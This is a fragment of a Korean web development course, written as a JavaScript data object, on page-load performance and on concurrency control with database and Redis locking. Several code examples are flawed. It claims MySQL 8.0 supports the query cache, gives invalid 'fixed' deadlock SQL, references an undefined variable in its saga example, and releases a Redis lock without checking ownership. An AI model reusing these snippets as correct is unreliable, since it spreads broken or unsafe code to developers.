# 4. Device: Mobile 또는 Desktop 선택
# 5. "Analyze page load" 버튼 클릭

# 결과 확인:
- Performance 점수 (0~100)
- FCP (First Contentful Paint): 1.8s
- LCP: 3.5s ← 느림! (2.5s 목표)
- TBT (Total Blocking Time): 150ms
- CLS: 0.05 ← 좋음!`},{label:"온라인 도구 사용",code:`# PageSpeed Insights
https://pagespeed.web.dev/

# 1. URL 입력
# 2. 모바일/데스크톱 결과 모두 확인
# 3. Opportunities (개선 기회) 섹션 주목
# 4. Diagnostics (진단) 섹션에서 문제 확인`}]},{heading:"4. 가장 느린 페이지 찾기",code:`// Backend에서 응답 시간 로깅 (Express.js 예시)
app.use((req, res, next) => {
  const start = Date.now();

  res.on('finish', () => {
    const duration = Date.now() - start;
    if (duration > 1000) { // 1초 이상
      console.log(\`[SLOW] \${req.method} \${req.url} - \${duration}ms\`);
    }
  });

  next();
});

// 실제 로그 예시:
// [SLOW] GET /api/products?page=5 - 2300ms ← 문제!
// [SLOW] POST /api/upload - 1800ms
// [SLOW] GET /dashboard - 1200ms`},{heading:"5. 이미지 최적화 - 가장 쉬운 개선",steps:[{label:"문제 확인",code:`# Lighthouse에서:
"Properly size images" - 200KB 절약 가능
"Serve images in modern formats" - WebP 사용 권장
"Efficiently encode images" - 품질 최적화 필요`},{label:"온라인 도구로 최적화",code:`# TinyPNG (https://tinypng.com/)
- PNG, JPEG 업로드
- 자동으로 60~70% 압축
- 품질 손실 거의 없음

# 예시:
product.jpg (500KB) → product-optimized.jpg (150KB)
- 70% 용량 감소
- 눈으로 차이 거의 없음`},{label:"WebP 변환 (최신 포맷)",code:`# Squoosh (https://squoosh.app/)
1. 이미지 업로드
2. 오른쪽에서 WebP 선택
3. Quality: 75~85 설정
4. 다운로드

# HTML에서 사용 (구형 브라우저 대비)
<picture>
  <source srcset="hero.webp" type="image/webp">
  <img src="hero.jpg" alt="Hero">
</picture>`}]},{heading:"6. 빠른 성과를 위한 체크리스트",checklist:["모든 이미지 WebP로 변환 (또는 압축)","이미지에 width/height 속성 추가 (CLS 방지)",'폰트 preload 설정: <link rel="preload" href="font.woff2" as="font">',"불필요한 JavaScript 라이브러리 제거","CSS 파일 압축 (Minify)"]},{heading:"💡 초급 실습 과제",checklist:["현재 사이트 Lighthouse 점수 측정 후 스크린샷 저장","가장 큰 이미지 3개 찾아서 WebP로 변환","변환 후 다시 측정하여 점수 개선 확인","LCP 시간이 몇 초 단축되었는지 기록"]}]},intermediate:{title:"중급: 병목 지점 분석하고 캐싱 전략 수립하기",sections:[{heading:"📚 학습 목표",content:"Chrome DevTools를 사용해 정확한 병목 지점을 찾고, 효과적인 캐싱 전략을 적용할 수 있다."},{heading:"1. Performance 탭으로 병목 분석",steps:[{label:"녹화 시작",code:`# Chrome DevTools → Performance 탭
1. 빨간 점(Record) 클릭
2. 페이지 새로고침 (Ctrl+R)
3. 로딩 완료 후 Stop 버튼

# 결과 읽기:
- FCP (파란 선): 1.2s
- LCP (초록 선): 3.8s ← 여기가 문제!
- Main 섹션: JavaScript 실행 시간
- Network 섹션: 리소스 로딩 시간`},{label:"병목 구간 확인",code:`# Main Thread 분석:
- Evaluate Script: 800ms ← 큰 번들 파일
- Parse HTML: 200ms
- Layout: 150ms
- Paint: 100ms

# 결론: JavaScript 번들 최적화 필요
- 큰 라이브러리 lazy load
- Code splitting 적용
- Tree shaking으로 미사용 코드 제거`}]},{heading:"2. Network 탭으로 느린 요청 찾기",code:`# Chrome DevTools → Network 탭
1. Disable cache 체크
2. 페이지 새로고침
3. Waterfall 차트 분석

# 문제 패턴:
┌─────────────────────────────────┐
│ app.js       │███████████████   │ 2.5s ← 너무 큼
│ api/products │      ████         │ 800ms ← DB 쿼리 느림
│ hero.jpg     │  ████             │ 600ms ← 이미지 큼
│ style.css    │██                 │ 200ms
└─────────────────────────────────┘

# 해결 방안:
1. app.js → Code splitting으로 나누기
2. api/products → 인덱스 추가 또는 Redis 캐싱
3. hero.jpg → WebP + CDN 사용`},{heading:"3. 브라우저 캐싱 전략",code:`// Express.js에서 Cache-Control 헤더 설정
app.use(express.static('public', {
  maxAge: '1y', // 1년 캐싱
  immutable: true
}));

// 정적 파일별로 다르게 설정
app.get('/api/*', (req, res) => {
  res.set('Cache-Control', 'no-cache'); // API는 캐시 안 함
});

app.get('/static/*', (req, res) => {
  res.set('Cache-Control', 'public, max-age=31536000'); // 이미지/CSS/JS는 1년
});

// Nginx 설정 예시
location ~* \\.(jpg|jpeg|png|gif|ico|css|js)$ {
  expires 1y;
  add_header Cache-Control "public, immutable";
}`},{heading:"4. CDN 활용하기",content:"정적 파일을 CDN에 올리면 전 세계 어디서나 빠르게 로딩됩니다.",steps:[{label:"Cloudflare CDN (무료) 설정",code:`# 1. Cloudflare 계정 생성
# 2. 도메인 추가
# 3. 네임서버 변경
# 4. Speed → Optimization 설정:
   - Auto Minify: HTML, CSS, JS 체크
   - Brotli 압축 활성화
   - 이미지 최적화 (Polish) 활성화

# 효과:
- 서버 부하 70% 감소
- 로딩 속도 50% 향상 (해외 사용자)
- HTTPS 자동 적용`}]},{heading:"5. Lazy Loading 구현",code:`// 이미지 Lazy Load (네이티브 방식)
<img src="product.jpg" loading="lazy" alt="Product">

// JavaScript 번들 Lazy Load (React 예시)
import { lazy, Suspense } from 'react';

const HeavyComponent = lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </Suspense>
  );
}

// 효과:
- 초기 번들 크기: 500KB → 200KB (60% 감소)
- FCP: 2.5s → 1.2s (52% 개선)`},{heading:"6. Database 쿼리 최적화",code:`// 문제: N+1 쿼리
products.forEach(async (product) => {
  const category = await db.query(
    'SELECT * FROM categories WHERE id = ?',
    [product.category_id]
  );
  // 100개 상품 → 100번 쿼리
});

// 해결: JOIN으로 한 번에
const products = await db.query(\`
  SELECT p.*, c.name as category_name
  FROM products p
  LEFT JOIN categories c ON p.category_id = c.id
\`);
// 1번 쿼리로 해결

// Redis 캐싱 추가
const cacheKey = 'products:all';
let products = await redis.get(cacheKey);

if (!products) {
  products = await db.query('SELECT * FROM products');
  await redis.setex(cacheKey, 300, JSON.stringify(products)); // 5분 캐시
}`},{heading:"⚡ 중급 실습 과제",checklist:["Performance 탭으로 메인 스레드 병목 구간 찾아서 스크린샷","가장 느린 API 엔드포인트 3개 찾고 응답 시간 기록","정적 파일에 1년 캐시 헤더 설정 후 Network 탭에서 확인","이미지 lazy loading 적용 후 LCP 개선 확인","Cloudflare CDN 연결 후 전/후 속도 비교 (GTmetrix 사용)"]}]},advanced:{title:"고급: 실시간 모니터링과 자동화된 성능 관리",sections:[{heading:"📚 학습 목표",content:"성능을 실시간으로 모니터링하고, 자동으로 개선하는 시스템을 구축할 수 있다."},{heading:"1. Real User Monitoring (RUM) 구축",content:"실제 사용자의 경험을 측정하는 시스템:",code:`// Frontend에서 Core Web Vitals 측정
import { getCLS, getFID, getLCP } from 'web-vitals';

function sendToAnalytics({ name, delta, id }) {
  fetch('/api/analytics', {
    method: 'POST',
    body: JSON.stringify({
      metric: name,
      value: delta,
      id: id,
      url: window.location.href,
      userAgent: navigator.userAgent
    }),
    headers: { 'Content-Type': 'application/json' }
  });
}

getCLS(sendToAnalytics);
getFID(sendToAnalytics);
getLCP(sendToAnalytics);

// Backend에서 저장 (MongoDB 예시)
app.post('/api/analytics', async (req, res) => {
  await db.collection('metrics').insertOne({
    ...req.body,
    timestamp: new Date()
  });
  res.sendStatus(200);
});`},{heading:"2. Lighthouse CI 자동화",content:"Pull Request마다 자동으로 성능 점검:",code:`# .github/workflows/lighthouse.yml
name: Lighthouse CI
on: [pull_request]

jobs:
  lighthouse:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run build

      - name: Run Lighthouse CI
        run: |
          npm install -g @lhci/cli
          lhci autorun
        env:
          LHCI_GITHUB_APP_TOKEN: \${{ secrets.LHCI_GITHUB_APP_TOKEN }}

# lighthouserc.json
{
  "ci": {
    "collect": {
      "url": ["http://localhost:3000"],
      "startServerCommand": "npm start"
    },
    "assert": {
      "assertions": {
        "categories:performance": ["error", {"minScore": 0.9}],
        "first-contentful-paint": ["error", {"maxNumericValue": 2000}],
        "interactive": ["error", {"maxNumericValue": 3500}]
      }
    }
  }
}

# 효과: 성능 점수 90 미만이면 PR merge 차단`},{heading:"3. 성능 예산 (Performance Budget) 설정",code:`// webpack-bundle-analyzer로 번들 크기 모니터링
// package.json
{
  "scripts": {
    "analyze": "webpack-bundle-analyzer dist/stats.json"
  }
}

// 번들 크기 제한 설정
// webpack.config.js
module.exports = {
  performance: {
    maxAssetSize: 244000, // 244KB
    maxEntrypointSize: 244000,
    hints: 'error' // 초과 시 빌드 실패
  }
};

// 이미지 크기 자동 최적화
// vite.config.js
import imagemin from 'vite-plugin-imagemin';

export default {
  plugins: [
    imagemin({
      gifsicle: { optimizationLevel: 7 },
      optipng: { optimizationLevel: 7 },
      mozjpeg: { quality: 80 },
      webp: { quality: 80 }
    })
  ]
};`},{heading:"4. 서버 사이드 렌더링 (SSR) 최적화",code:`// Next.js에서 증분 정적 재생성 (ISR)
export async function getStaticProps() {
  const products = await fetchProducts();

  return {
    props: { products },
    revalidate: 60 // 60초마다 재생성
  };
}

// 효과:
// 1. 초기 로딩: HTML이 즉시 표시 (LCP 0.8s)
// 2. 캐시: 60초 동안 정적 파일 제공
// 3. 업데이트: 백그라운드에서 자동 재생성

// Edge Functions로 지역별 최적화
export const config = {
  runtime: 'edge'
};

export default async function handler(req) {
  const country = req.geo.country;
  const products = await getProductsByCountry(country);

  return new Response(JSON.stringify(products), {
    headers: {
      'Cache-Control': 's-maxage=3600, stale-while-revalidate'
    }
  });
}`},{heading:"5. Database 연결 풀링과 쿼리 캐싱",code:`// MySQL 연결 풀 최적화
const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  password: 'password',
  database: 'cms',
  connectionLimit: 20, // 최대 20개 연결
  queueLimit: 0,
  waitForConnections: true,
  enableKeepAlive: true,
  keepAliveInitialDelay: 0
});

// Query Result Caching (MySQL 8.0+)
SET GLOBAL query_cache_type = ON;
SET GLOBAL query_cache_size = 67108864; // 64MB

// 또는 Application Level Caching
const NodeCache = require('node-cache');
const cache = new NodeCache({ stdTTL: 600 }); // 10분

app.get('/api/products', async (req, res) => {
  const cacheKey = \`products_\${req.query.page}\`;

  let data = cache.get(cacheKey);
  if (data) {
    return res.json({ data, cached: true });
  }

  data = await pool.query('SELECT * FROM products LIMIT ?, 20', [offset]);
  cache.set(cacheKey, data);

  res.json({ data, cached: false });
});`},{heading:"6. APM (Application Performance Monitoring) 도구",steps:[{label:"New Relic 설정 (무료 플랜)",code:`# 1. New Relic 계정 생성
# 2. Node.js 에이전트 설치
npm install newrelic

# 3. newrelic.js 설정
exports.config = {
  app_name: ['My CMS'],
  license_key: 'YOUR_LICENSE_KEY',
  logging: {
    level: 'info'
  }
};

# 4. 앱 시작 시 로드
// index.js 최상단
require('newrelic');
const express = require('express');

# 모니터링 가능:
- 응답 시간 분포 (p50, p95, p99)
- 느린 트랜잭션 자동 탐지
- DB 쿼리 성능 추적
- 에러율 및 스택 트레이스`},{label:"Sentry로 성능 모니터링",code:`import * as Sentry from '@sentry/node';

Sentry.init({
  dsn: 'YOUR_DSN',
  tracesSampleRate: 0.1, // 10% 트랜잭션 추적
  integrations: [
    new Sentry.Integrations.Http({ tracing: true }),
    new Sentry.Integrations.Express({ app })
  ]
});

// 느린 API 자동 감지
app.use(Sentry.Handlers.requestHandler());
app.use(Sentry.Handlers.tracingHandler());

// 커스텀 성능 측정
const transaction = Sentry.startTransaction({
  op: 'db.query',
  name: 'Fetch Products'
});

const products = await db.query('SELECT * FROM products');

transaction.finish();`}]},{heading:"⚡ 고급 실습 과제",checklist:["web-vitals 라이브러리로 RUM 구축 후 7일간 데이터 수집","Lighthouse CI를 GitHub Actions에 통합하여 자동 점검","번들 크기 200KB 이하로 제한하고 초과 시 빌드 실패 설정","Next.js ISR 또는 SSR 적용 후 LCP 2초 이내 달성","New Relic 또는 Sentry 연동 후 p95 응답 시간 500ms 이하 유지"]}]}}},{id:"3-2",name:"동시성 제어와 Race Condition",goal:"여러 사용자가 동시에 데이터를 수정할 때 생기는 문제를 해결할 수 있다",hours:10,keywords:["race condition","concurrency control","database locking"],tasks:["2개 브라우저로 동시 수정 테스트","충돌 상황 재현","간단한 잠금 메커니즘 구현"],content:{beginner:{title:"초급: Race Condition이 무엇인지 이해하고 문제 재현하기",sections:[{heading:"📚 학습 목표",content:"동시성 문제가 무엇인지 이해하고, 실제로 문제를 재현해볼 수 있다."},{heading:"1. Race Condition이란?",content:"여러 사용자가 동시에 같은 데이터를 수정할 때 발생하는 문제입니다.",code:`# 시나리오: 재고 10개인 상품을 두 명이 동시 구매
시간  |  사용자A          |  사용자B          |  실제 재고
-----|------------------|------------------|----------
1초   | 재고 확인 (10개) |                  | 10
2초   | 1개 구매 결정    | 재고 확인 (10개) | 10
3초   | 재고 = 10-1 = 9  | 1개 구매 결정    | 10
4초   | 저장 (9개)       | 재고 = 10-1 = 9  | 9
5초   |                  | 저장 (9개)       | 9 ← 버그!

# 문제: 2개 팔렸는데 재고는 1개만 줄어듦
# 원인: 두 사용자가 같은 초기값(10)을 읽었기 때문`},{heading:"2. 실제 발생하는 문제 사례",list:["이커머스: 재고 10개인데 15명이 구매 성공 → 마이너스 재고","은행 앱: 잔액 1만원인데 동시 출금으로 2만원 인출","좋아요 기능: 100개였는데 동시 클릭으로 101이 아닌 99로 변경","게시글 조회수: 정확하지 않은 카운팅"]},{heading:"3. 문제 재현하기 (브라우저 2개)",steps:[{label:"테스트 페이지 준비",code:`<!-- test-race.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>재고 관리 테스트</h1>
  <p>현재 재고: <span id="stock">10</span>개</p>
  <button onclick="buyProduct()">구매하기 (1개)</button>

  <script>
    async function buyProduct() {
      // 1. 현재 재고 읽기
      const response = await fetch('/api/stock');
      const { stock } = await response.json();

      console.log('현재 재고:', stock);

      // 2. 1초 대기 (동시 실행 시뮬레이션)
      await new Promise(r => setTimeout(r, 1000));

      // 3. 재고 감소시켜서 저장
      await fetch('/api/stock', {
        method: 'PUT',
        body: JSON.stringify({ stock: stock - 1 }),
        headers: { 'Content-Type': 'application/json' }
      });

      // 4. 화면 업데이트
      document.getElementById('stock').textContent = stock - 1;
    }
  <\/script>
</body>
</html>`},{label:"백엔드 API (Express.js)",code:`let stock = 10; // 초기 재고

app.get('/api/stock', (req, res) => {
  res.json({ stock });
});

app.put('/api/stock', (req, res) => {
  stock = req.body.stock;
  console.log('재고 업데이트:', stock);
  res.json({ stock });
});`},{label:"재현 방법",code:`1. 브라우저 2개 열기 (Chrome, Edge 또는 시크릿 모드)
2. 양쪽 모두 http://localhost:3000/test-race.html 접속
3. 동시에 "구매하기" 버튼 클릭 (0.5초 차이 내)

# 예상 결과: 재고 8개 (10 - 1 - 1)
# 실제 결과: 재고 9개 (버그!)

# 로그:
[브라우저A] 현재 재고: 10
[브라우저B] 현재 재고: 10
[서버] 재고 업데이트: 9
[서버] 재고 업데이트: 9 ← 문제 발생!`}]},{heading:"4. 간단한 해결책: Optimistic Locking (낙관적 잠금)",code:`// 버전 번호를 추가
let stock = 10;
let version = 1;

app.put('/api/stock', (req, res) => {
  const { newStock, clientVersion } = req.body;

  // 버전이 다르면 실패
  if (clientVersion !== version) {
    return res.status(409).json({
      error: '다른 사용자가 먼저 수정했습니다. 새로고침 후 다시 시도하세요.'
    });
  }

  // 버전이 같으면 업데이트
  stock = newStock;
  version++; // 버전 증가
  res.json({ stock, version });
});

// Frontend 수정
async function buyProduct() {
  const { stock, version } = await fetch('/api/stock').then(r => r.json());

  await new Promise(r => setTimeout(r, 1000));

  const response = await fetch('/api/stock', {
    method: 'PUT',
    body: JSON.stringify({
      newStock: stock - 1,
      clientVersion: version // 버전 포함
    }),
    headers: { 'Content-Type': 'application/json' }
  });

  if (response.status === 409) {
    alert('다른 사용자가 먼저 구매했습니다. 다시 시도해주세요.');
    location.reload();
  }
}`},{heading:"5. MySQL에서 Optimistic Locking",code:`-- 테이블에 version 컬럼 추가
ALTER TABLE products ADD COLUMN version INT DEFAULT 1;

-- 업데이트 쿼리 (버전 체크)
UPDATE products
SET stock = stock - 1,
    version = version + 1
WHERE id = 123
  AND version = ?; -- 클라이언트가 읽은 버전

-- 결과:
-- affected rows = 1: 성공
-- affected rows = 0: 실패 (다른 사용자가 먼저 수정함)`},{heading:"💡 초급 실습 과제",checklist:["위 HTML 파일로 Race Condition 재현 후 스크린샷","브라우저 개발자 도구 Console에서 로그 확인","Optimistic Locking 적용 후 다시 테스트","충돌 시 에러 메시지 표시되는지 확인"]}]},intermediate:{title:"중급: 데이터베이스 잠금과 트랜잭션으로 해결하기",sections:[{heading:"📚 학습 목표",content:"데이터베이스 잠금 메커니즘과 트랜잭션 격리 수준을 이해하고 적용할 수 있다."},{heading:"1. Pessimistic Locking (비관적 잠금)",content:"데이터를 읽을 때 미리 잠금을 걸어서 다른 사용자의 접근을 차단합니다.",code:`// MySQL에서 FOR UPDATE 사용
START TRANSACTION;

SELECT stock FROM products
WHERE id = 123
FOR UPDATE; -- 이 행을 잠금 (다른 트랜잭션은 대기)

-- stock이 10이라고 가정
UPDATE products
SET stock = 10 - 1
WHERE id = 123;

COMMIT; -- 잠금 해제

// Node.js 구현
app.post('/api/purchase', async (req, res) => {
  const connection = await pool.getConnection();

  try {
    await connection.beginTransaction();

    // 1. 잠금을 걸고 재고 조회
    const [rows] = await connection.query(
      'SELECT stock FROM products WHERE id = ? FOR UPDATE',
      [req.body.productId]
    );

    const currentStock = rows[0].stock;

    if (currentStock < 1) {
      throw new Error('재고 부족');
    }

    // 2. 재고 감소
    await connection.query(
      'UPDATE products SET stock = stock - 1 WHERE id = ?',
      [req.body.productId]
    );

    await connection.commit();
    res.json({ success: true, remainingStock: currentStock - 1 });

  } catch (error) {
    await connection.rollback();
    res.status(400).json({ error: error.message });
  } finally {
    connection.release();
  }
});`},{heading:"2. 트랜잭션 격리 수준 (Isolation Level)",code:`# MySQL 격리 수준 4단계

# 1. READ UNCOMMITTED (커밋 안 된 데이터도 읽음)
- 문제: Dirty Read (롤백될 데이터 읽음)
- 사용: 거의 안 함

# 2. READ COMMITTED (커밋된 데이터만 읽음)
- 문제: Non-repeatable Read (같은 쿼리가 다른 결과)
- 사용: PostgreSQL 기본값

# 3. REPEATABLE READ (같은 트랜잭션 내 일관된 읽기)
- 문제: Phantom Read (새로운 행 추가 감지 못함)
- 사용: MySQL 기본값 ← 대부분 이걸 사용

# 4. SERIALIZABLE (완전 격리)
- 문제: 성능 저하 (순차 실행)
- 사용: 금융권 중요 거래

-- 설정 방법
SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;

-- 현재 설정 확인
SELECT @@transaction_isolation;`},{heading:"3. Deadlock (교착 상태) 이해하고 해결하기",code:`# Deadlock 발생 시나리오

시간 | 트랜잭션 A                    | 트랜잭션 B
-----|------------------------------|-----------------------------
1초  | SELECT * FROM orders WHERE id=1 FOR UPDATE |
2초  |                              | SELECT * FROM orders WHERE id=2 FOR UPDATE
3초  | SELECT * FROM orders WHERE id=2 FOR UPDATE (대기) |
4초  |                              | SELECT * FROM orders WHERE id=1 FOR UPDATE (대기)
5초  | [Deadlock 발생!]             | [Deadlock 발생!]

-- MySQL은 자동으로 하나를 롤백:
ERROR 1213: Deadlock found when trying to get lock

# 해결 방법 1: 항상 같은 순서로 잠금
// Bad (교착 상태 가능)
UPDATE orders WHERE id = 2;
UPDATE orders WHERE id = 1;

// Good (ID 순서대로)
UPDATE orders WHERE id IN (1, 2) ORDER BY id;

# 해결 방법 2: 잠금 타임아웃 설정
SET SESSION innodb_lock_wait_timeout = 5; -- 5초 대기 후 실패

# 해결 방법 3: 재시도 로직
async function updateWithRetry(query, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await db.query(query);
    } catch (error) {
      if (error.code === 'ER_LOCK_DEADLOCK' && i < maxRetries - 1) {
        await new Promise(r => setTimeout(r, 100 * (i + 1))); // 지수 백오프
        continue;
      }
      throw error;
    }
  }
}`},{heading:"4. Redis를 이용한 분산 잠금",content:"여러 서버가 있을 때는 Redis로 잠금을 관리합니다.",code:`const Redis = require('ioredis');
const redis = new Redis();

// Redlock 알고리즘 구현
async function acquireLock(key, ttl = 5000) {
  const lockKey = \`lock:\${key}\`;
  const lockValue = Date.now() + ttl;

  // SET NX: 키가 없을 때만 설정
  const result = await redis.set(
    lockKey,
    lockValue,
    'PX', ttl, // milliseconds
    'NX'       // Not eXists
  );

  return result === 'OK';
}

async function releaseLock(key) {
  await redis.del(\`lock:\${key}\`);
}

// 사용 예시
app.post('/api/purchase', async (req, res) => {
  const productId = req.body.productId;
  const lockKey = \`product:\${productId}\`;

  // 1. 잠금 시도
  const locked = await acquireLock(lockKey, 3000);

  if (!locked) {
    return res.status(409).json({
      error: '다른 사용자가 처리 중입니다. 잠시 후 다시 시도해주세요.'
    });
  }

  try {
    // 2. 재고 확인 및 차감
    const stock = await db.query(
      'SELECT stock FROM products WHERE id = ?',
      [productId]
    );

    if (stock[0].stock < 1) {
      throw new Error('재고 부족');
    }

    await db.query(
      'UPDATE products SET stock = stock - 1 WHERE id = ?',
      [productId]
    );

    res.json({ success: true });

  } finally {
    // 3. 잠금 해제
    await releaseLock(lockKey);
  }
});`},{heading:"5. 실전: 선착순 이벤트 구현",code:`// 문제: 100명 한정 쿠폰을 1000명이 동시 요청
// 해결: Redis INCR (원자적 연산)

app.post('/api/coupon/claim', async (req, res) => {
  const eventId = req.body.eventId;
  const userId = req.user.id;
  const key = \`event:\${eventId}:count\`;

  // 1. 원자적으로 카운트 증가
  const count = await redis.incr(key);

  // 2. 100명 초과 시 실패
  if (count > 100) {
    return res.status(410).json({
      error: '마감되었습니다.'
    });
  }

  // 3. 쿠폰 발급
  await db.query(
    'INSERT INTO coupons (event_id, user_id) VALUES (?, ?)',
    [eventId, userId]
  );

  res.json({
    success: true,
    yourNumber: count // 몇 번째 당첨자인지
  });
});

// TTL 설정 (24시간 후 자동 삭제)
await redis.expire(\`event:\${eventId}:count\`, 86400);`},{heading:"⚡ 중급 실습 과제",checklist:["FOR UPDATE로 Pessimistic Locking 구현 후 동시 요청 테스트","Deadlock 의도적으로 발생시키고 에러 로그 확인","Redis 분산 잠금으로 선착순 이벤트 구현 (100명 한정)","Apache Bench로 동시 요청 1000개 보내서 정확히 100명만 성공하는지 확인","트랜잭션 격리 수준 변경 후 동작 차이 테스트"]}]},advanced:{title:"고급: 분산 시스템에서의 동시성 제어와 이벤트 소싱",sections:[{heading:"📚 학습 목표",content:"분산 환경에서 동시성을 제어하고, 이벤트 소싱 패턴을 이해할 수 있다."},{heading:"1. 분산 트랜잭션 (2PC - Two Phase Commit)",content:"여러 데이터베이스에 걸친 트랜잭션을 안전하게 처리하는 방법:",code:`// 문제: 주문 DB와 재고 DB가 분리된 경우
// 주문은 성공했는데 재고 차감 실패 → 데이터 불일치

// 2단계 커밋 프로토콜
class DistributedTransaction {
  async execute() {
    const participants = [orderDB, inventoryDB, paymentDB];

    // Phase 1: Prepare (준비 단계)
    try {
      for (const db of participants) {
        await db.prepare(); // 트랜잭션 시작, 잠금 획득
      }
    } catch (error) {
      // 하나라도 실패하면 모두 롤백
      for (const db of participants) {
        await db.rollback();
      }
      throw error;
    }

    // Phase 2: Commit (커밋 단계)
    try {
      for (const db of participants) {
        await db.commit();
      }
    } catch (error) {
      // 치명적 오류: 수동 복구 필요
      console.error('Commit failed:', error);
      // 보상 트랜잭션 실행
    }
  }
}

// 실제 구현 (Saga 패턴)
async function createOrder(orderData) {
  const sagaId = uuid();

  try {
    // 1. 주문 생성
    const order = await orderDB.create(orderData);

    // 2. 재고 차감
    await inventoryDB.decreaseStock(order.productId, order.quantity);

    // 3. 결제 처리
    await paymentDB.charge(order.userId, order.amount);

    return order;

  } catch (error) {
    // 보상 트랜잭션 (Compensating Transaction)
    await orderDB.cancel(order.id);
    await inventoryDB.increaseStock(order.productId, order.quantity);
    // 결제는 아직 안 했으므로 보상 불필요

    throw error;
  }
}`},{heading:"2. Redlock (Redis 분산 잠금 알고리즘)",content:"여러 Redis 인스턴스에서 안전하게 잠금을 관리:",code:`const Redlock = require('redlock');
const Redis = require('ioredis');

// 최소 3개의 Redis 인스턴스 (홀수 권장)
const redisA = new Redis({ host: 'redis1.example.com' });
const redisB = new Redis({ host: 'redis2.example.com' });
const redisC = new Redis({ host: 'redis3.example.com' });

const redlock = new Redlock(
  [redisA, redisB, redisC],
  {
    driftFactor: 0.01,
    retryCount: 10,
    retryDelay: 200,
    retryJitter: 200
  }
);

// 잠금 획득
app.post('/api/limited-offer', async (req, res) => {
  const resource = 'limited-offer:item123';
  const ttl = 5000; // 5초

  let lock;
  try {
    // 과반수(2/3) Redis에서 잠금 획득 성공해야 함
    lock = await redlock.acquire([resource], ttl);

    // 비즈니스 로직 실행
    const stock = await db.query('SELECT stock FROM products WHERE id = 123');

    if (stock[0].stock > 0) {
      await db.query('UPDATE products SET stock = stock - 1 WHERE id = 123');
      res.json({ success: true });
    } else {
      res.status(410).json({ error: '품절' });
    }

  } catch (error) {
    res.status(409).json({ error: '잠시 후 다시 시도해주세요' });

  } finally {
    if (lock) {
      await lock.release();
    }
  }
});`},{heading:"3. 이벤트 소싱 (Event Sourcing) 패턴",content:"상태를 직접 저장하지 않고 이벤트 시퀀스로 저장하여 동시성 문제 해결:",code:`// 기존 방식 (상태 저장)
UPDATE accounts SET balance = balance - 100 WHERE id = 123;
// 문제: 동시 출금 시 Race Condition 발생

// 이벤트 소싱 (이벤트 저장)
// events 테이블
// id | aggregate_id | event_type | amount | timestamp | version
// 1  | acc-123      | Deposited  | 1000   | ...       | 1
// 2  | acc-123      | Withdrawn  | 100    | ...       | 2
// 3  | acc-123      | Withdrawn  | 50     | ...       | 3

class BankAccount {
  constructor(accountId) {
    this.accountId = accountId;
    this.balance = 0;
    this.version = 0;
  }

  // 이벤트 적용
  apply(event) {
    switch (event.type) {
      case 'Deposited':
        this.balance += event.amount;
        break;
      case 'Withdrawn':
        this.balance -= event.amount;
        break;
    }
    this.version = event.version;
  }

  // 상태 복원
  static async load(accountId) {
    const account = new BankAccount(accountId);

    const events = await db.query(
      'SELECT * FROM events WHERE aggregate_id = ? ORDER BY version',
      [accountId]
    );

    events.forEach(event => account.apply(event));
    return account;
  }

  // 출금 커맨드
  async withdraw(amount) {
    if (this.balance < amount) {
      throw new Error('잔액 부족');
    }

    const event = {
      aggregate_id: this.accountId,
      type: 'Withdrawn',
      amount: amount,
      version: this.version + 1
    };

    // Optimistic Concurrency Control
    const result = await db.query(\`
      INSERT INTO events (aggregate_id, event_type, amount, version)
      SELECT ?, ?, ?, ?
      WHERE NOT EXISTS (
        SELECT 1 FROM events
        WHERE aggregate_id = ? AND version >= ?
      )
    \`, [
      this.accountId, event.type, event.amount, event.version,
      this.accountId, event.version
    ]);

    if (result.affectedRows === 0) {
      throw new Error('다른 사용자가 먼저 처리했습니다. 다시 시도해주세요.');
    }

    this.apply(event);
  }
}

// 사용
const account = await BankAccount.load('acc-123');
await account.withdraw(100);`},{heading:"4. CQRS (Command Query Responsibility Segregation)",content:"읽기와 쓰기를 분리하여 성능과 확장성 향상:",code:`// Write Model (명령 처리)
class OrderCommandHandler {
  async createOrder(command) {
    // 1. 이벤트 생성
    const event = {
      type: 'OrderCreated',
      orderId: uuid(),
      userId: command.userId,
      items: command.items,
      timestamp: new Date()
    };

    // 2. 이벤트 스토어에 저장
    await eventStore.append('orders', event);

    // 3. 이벤트 발행 (Message Queue)
    await eventBus.publish('order.created', event);
  }
}

// Read Model (조회 최적화)
// 이벤트를 구독하여 읽기 전용 DB 업데이트
eventBus.subscribe('order.created', async (event) => {
  // MongoDB에 비정규화된 데이터 저장
  await readDB.collection('orders').insertOne({
    orderId: event.orderId,
    userId: event.userId,
    items: event.items,
    userName: await getUserName(event.userId), // Join 미리 수행
    totalAmount: calculateTotal(event.items),
    createdAt: event.timestamp
  });

  // Elasticsearch에 검색용 인덱스 생성
  await searchIndex.index({
    index: 'orders',
    id: event.orderId,
    body: {
      orderId: event.orderId,
      items: event.items.map(i => i.name).join(' '),
      createdAt: event.timestamp
    }
  });
});

// 조회 API (읽기 전용 DB 사용)
app.get('/api/orders/:userId', async (req, res) => {
  const orders = await readDB.collection('orders').find({
    userId: req.params.userId
  }).toArray();

  res.json(orders); // 빠른 조회, JOIN 불필요
});`},{heading:"5. CRDTs (Conflict-free Replicated Data Types)",content:"분산 시스템에서 자동으로 충돌 해결하는 자료구조:",code:`// 예시: 협업 문서 편집 (Google Docs 같은)
// G-Counter (증가만 가능한 카운터)
class GCounter {
  constructor(nodeId) {
    this.nodeId = nodeId;
    this.counts = {}; // { node1: 5, node2: 3 }
  }

  increment() {
    this.counts[this.nodeId] = (this.counts[this.nodeId] || 0) + 1;
  }

  value() {
    return Object.values(this.counts).reduce((a, b) => a + b, 0);
  }

  merge(other) {
    for (const [node, count] of Object.entries(other.counts)) {
      this.counts[node] = Math.max(
        this.counts[node] || 0,
        count
      );
    }
  }
}

// 사용 (좋아요 카운터)
const counter1 = new GCounter('server1');
const counter2 = new GCounter('server2');

counter1.increment(); // server1에서 +1
counter2.increment(); // server2에서 +1
counter2.increment(); // server2에서 +1

console.log(counter1.value()); // 1
console.log(counter2.value()); // 2

// 동기화 (네트워크 복구 후)
counter1.merge(counter2);
console.log(counter1.value()); // 3 (자동 병합!)

